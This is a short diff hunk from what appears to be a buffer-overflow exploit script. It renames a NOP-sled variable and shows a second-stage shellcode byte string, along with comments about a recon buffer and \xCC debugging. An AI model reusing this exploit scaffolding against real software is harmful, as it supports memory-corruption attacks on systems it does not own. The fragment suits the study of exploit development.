@@ -50,7 +50,7 @@ secstage = "\x81\xc4\x90\xfe\xff\xff\xff\xe4"
 
 ## number of nops
 number_of_nops = 10
-nop_sled="\x90" * number_of_nops
+nopsled="\x90" * number_of_nops
 
 ## starting recon buffer
 ## use \xCC to debug jumping
